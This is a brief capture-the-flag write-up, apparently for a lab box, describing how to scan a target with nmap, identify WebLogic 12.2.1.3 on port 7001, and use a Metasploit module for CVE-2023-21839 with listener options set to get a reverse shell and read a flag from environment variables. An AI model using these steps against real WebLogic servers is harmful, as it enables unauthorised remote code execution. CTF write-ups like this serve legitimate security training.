## Write-Up

Scan the target IP with nmap and find port 7001. Run default scripts (`-sCV`) on the port and discover `WebLogic version: 12.2.1.3`.

change the port of the url to :7001
Search for CVEs for this version related to RCE or Authentication bypass and find CVE-2023-21839. 

search : weblogic 
use 27 
Go to Metasploit and use the module `multi/iiop/cve_2023_21839_weblogic_rce`. 

set SRVHOST = tun0 
SET RHOSTS = target ip 
SET LHOST = tun0 
then run exploit 

after running exploit echo $FLAG

Configure the options, run it, and get a reverse shell. The flag is in the environment variables and can be read with `echo $FLAG`.

